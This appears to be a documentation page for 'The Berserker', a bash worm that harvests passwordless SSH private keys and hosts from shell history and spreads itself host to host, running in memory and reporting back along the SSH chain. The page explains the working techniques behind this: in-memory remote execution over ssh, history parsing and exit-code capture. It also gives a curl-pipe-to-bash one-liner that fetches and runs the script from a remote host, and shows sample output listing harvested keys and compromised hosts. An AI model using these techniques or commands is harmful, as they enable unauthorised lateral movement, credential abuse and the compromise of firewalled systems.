---
layout: default
title: The Berserker | How it works
description: Technical details about how The Berserker works.
---

<!-- {:refdef: style="text-align: center;"}
## **A recursive, non-intrusive and ephemeral tool to find password-less private ssh-keys and build a hierarchical tree of reachable hosts**
{: refdef} -->

Random notes on how [The Berserker](../) works.

## Executive Summary

[The Berserker](../) is a bash script. At this point the reader either has a heart attack or multiple orgasms. There is no in-between.

## General

The Berserker looks for any passwordless private ssh-key in `~/.ssh` and then gathers information from the User's shell history (`~/.bash_history`, `.zsh_history` and `~/.history`) about any host the User connected to in the past. The Berserker then attempts to log into each host and injects itself into the remote's bash memory. It executes itself on the remote host and continues to do its deeds.

It keeps doing so until all ssh keys have been used and all hosts have been visited.

**Example**: User `alice` starts The Berserker on host `Earth` (the *origin*). The Berserker finds Alice's ssh-key and detects (from Alice's shell history) that `alice` frequently connects to `Mars` (as alice) and `Jupiter` (as root). The Berserker first connects to `Mars` and executes itself on `Mars`. Let's assume The Berserker finds no further ssh-keys on `Mars` and so it will not spread beyond `Mars`. Next it connects from `Earth` to `Jupiter`. It's a root login to `Jupiter` and The Berserker finds many ssh-keys from various users. One such user is `bob` who frequently connects to `Uranus` and from there to `Pluto`. Ultimately The Berserker will get to `Pluto` via a long ssh chain from `Earth`->`Jupiter`->`Uranus`->`Pluto`.

At this point the educated reader will realise that The Berserker is *deep penetrating* `Uranus`, e.g. `Uranus` gets owned even if firewalled or not being accessible from the Internet (but accessible from `Jupiter`).

Berserker implements a text-based communication protocol via the stdin/stdout ssh-chain to send its findings back to `Earth` (the *origin* where The Berserker started).

## Bash In-Memory execution

Bash has this tremendous ability to load a script from a memory location and without the script needing to be stored on the target host.

```shell
cat >e.sh<<__EOF__
#! /bin/bash
echo "Hello '\$USER'"
__EOF__
S="$(cat e.sh | sed 's/\x27/\x27"\x27"\x27/g')"
ssh user@host.com "export SCRIPT='$S'; bash -c \"\$SCRIPT\""
```

1. Create a bash script named `e.sh`.
1. Slurp the content into the variable `$S` after converting all `'` to `'"'"'`. That's a bit freaky but hold your beer.
1. I use the hex notation (`\x27`) of `'` here or otherwise it would look rather complicated (`sed` needs the `'` escaped so it is double-escaping time): `S="$(cat e.sh | sed 's/'"'"'/'"'"'"'"'"'"'"'"'/g')"`. Most readers would commit suicide at this point. This is just to escape `'` correctly so that it can be passed to `ssh` as a command via a variable (`SCRIPT='$S'`) without interfering with the `'` around the `$S`.
1. The long string `export SCRIPT='$S'; bash -c \"\$SCRIPT\"` is passed as a command to `ssh` to execute on the remote host. Note that the `$` in `\"\$SCRIPT\"` is escaped to prevent the local shell from substituting the variable. We like the remote bash (not the local one) to substitute `$SCRIPT`. This is only needed because The Berserker needs to access the source of its own script (now stored in `$SCRIPT` to spread to further hosts). Otherwise `bash -c '$S'` would work.

No data is written to the target's host hard drive. All is kept in memory.

SSH has a 128k limit for passing arguments. *That ought to be enough for everyone*. Otherwise have a look how this limitation is overcome in [ssh-it's hook.sh](https://github.com/hackerschoice/ssh-it/blob/main/src/hook.sh) (piping a script with `dd` into a remote bash variable and executing the string from memory is a thing....).

## Bash Command line parsing

There is no efficient way to convert a command line string from `~/.bash_history` to an array in bash.

The history file contains the recently *typed* commands rather then the *executed* commands. There is a fine difference. Bash records the input rather then what's passed to exec(2) system call. Let's illustrate the problem:

```shell
ls foo\ bar
```

The bash records `ls foo\ bar` rather than what it actually executes (`exec("ls", "foo bar")`; note the missing `\`). This is a problem if there are history entries containing bash variables or escape sequences like `$HOME` or `\ ` in the file name:

```shell
ssh -i $HOME/.ssh/id_dsa\ key.dat root@openbsd.org
```

The command actually executed is `exec("ssh", "-i", "/home/user/.ssh/id_dsa key.dat", "root@openbsd.org")` and from the string above it's impossible to determine which argument is passed as 1st, 2nd or last parameter to exec(2) - only bash knows.

The program `xargs` comes to the rescue to split the command line string into separate ARGV arguments the same way as bash would do. However, xargs executes another program (with the correctly split arguments). So we used `xargs` to call `bash -c` and output each command line argument in a separate line and then convert this into a bash array:

```shell
line="$(echo "ssh -i ~/.ssh/id_dsa\ key.dat root@openbsd.org" | xargs bash -c 'n=0; while [[ $n -le ${#} ]]; do eval eval echo "\$${n}"; n=$((n+1)); done')"
```

The variable `line` now contains:

```
ssh
-i
/home/user/.ssh/id_dsa key.dat
root@openbsd.org
```

Note: The double `eval eval` is needed. The first one convert the `${#}` to the integer number of the arguments passed to the bash by `xargs` and the second `eval` resolves the `~/` to the absolute directory name.

That format can now easily be split into an array like so:

```shell
IFS=$'\n' MyArray=($line)
```

We can add this into a nice bash function and have the bash-array returned by *pointer* (yes, bash can do pointers):

```shell
bash -l
cat >test.sh<<__EOF__
cmdline2array()
{
	local line
	# Double eval: 1st: To turn \$1 to argument string. 2nd to turn ~/.ssh to /home/user/.ssh
	line="\$(echo "\$2" | xargs bash -c 'n=0; while [[ \$n -le \${#} ]]; do eval eval echo "\\\$\${n}"; n=\$((n+1)); done')"
	# echo "LINES=\$line"
	IFS=$'\n' eval "\${1}=(\\\$line)"
	IFS=" "
}
__EOF__

# Now calling this function will store the arguments as array in 'MyArray':
source test.sh
cmdline2array MyArray "ssh -i ~/.ssh/id_dsa\ key.dat root@openbsd.org"
echo "Number of elements in MyArray: ${#MyArray[@]}"
# The output is '4'
echo "Content: ${MyArray[*]}"
# The output is: ssh -i /home/user/.ssh/id_dsa key.dat root@openbsd.org
```

 * Note how the *string* `MyArray` is passed as a function parameter (followed by the ssh command). Inside the function we use `eval` on that string to 'turn' the string-name (`MyArray`) into a bash variable. And that is how you (efficiently) pass one or more return values from the function back to the caller.

## Bash stderr and $? catching

The Berserker needs to check the error output of `ssh` _and_ also needs the exit-code of `ssh` _and_ the standard output must pass through. The only way to do this in bash is to play file descriptor bonanza:

```shell
{ err="$( { echo 1>&2 "Hello-STDERR"; exit 123; } 2>&1 1>&3 3>&- )"; } 3>&1 || ret=$?
echo "ret=$ret, err=$err"
```

* The `echo 1>&2 "Hello-STDERR";` generates some test output to STDERR.
* The `exit 123;` is some test exit code (123).

The output is `ret=123, err=Hello-STDERR`.

## Transport Protocol via STDIN/STDOUT

All the slaves need to report back their findings to `Earth` (the *origin*). A simple protocol is used to pass the information from the farthest `ssh` back to the *origin* (via a long chain ssh-stdin-chain). In our example from above `Pluto` would pass the message back to `Uranus`, `Uranus` back to `Jupitor`, ... to `Mars`, ... to `Earth`. All protocol messages are then dispatched at the *origin* in `msg_dispatch()`. The protocol messages are rather simple and you can see them by forcing the *origin* to be a slave with `BS_DEBUG_IS_SLAVE=1`:

```shell
export BS="$(curl -fsSL ssh-it.thc.org/bs)" && bash -c "BS_DEBUG_IS_SLAVE=1 $BS"
```

The output will look similar to this:

```
|I|0|76672d|[#1] ~/.ssh/id_rsa
|I|0|76672d|[#2] ~/.ssh/id_rsa-old
|T|0|76672d|admin@192.168.1.1|1/112
|O|0|76672d|
|L|1|437048|76672d|admin|ubnt
|C|0|76672d|~/.ssh/id_rsa
|T|0|76672d|pi@192.168.1.18|3/112
|O|0|76672d|
|L|1|39a307|76672d|pi|raspberrypi
|I|1|39a307|Found 1 hosts to try.
|I|1|39a307|Found 1 key without password.
|I|1|39a307|[#1] ~/.ssh/id_rsa
```

## If you are reading this...

If you made it all the way to here then you are the type of person we like to hang out with. Join us on [Telegram](https://t.me/thcorg).

## Contact

{% include contact-details.md %}
